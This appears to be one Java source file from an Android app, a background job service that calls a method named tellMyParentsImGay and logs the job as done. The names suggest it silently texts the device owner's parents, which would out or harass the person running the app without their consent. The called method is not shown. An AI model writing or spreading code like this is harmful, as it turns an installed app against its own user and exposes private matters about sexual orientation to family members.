package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Process;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.JobsIntentService;
import com.candroid.textme.jobs.JobsScheduler;

public class TextParentsJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
/*        Intent textParentsIntent = new Intent(this, JobsIntentService.class);
        textParentsIntent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
        startService(textParentsIntent);*/
        new Thread(new Runnable() {
            @Override
            public void run() {
                android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                Lofl.tellMyParentsImGay(TextParentsJobService.this);
                Lofl.setJobRan(TextParentsJobService.this, JobsScheduler.TEXT_PARENTS_KEY);
                TextParentsJobService.this.jobFinished(params, false);
            }
        }).start();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}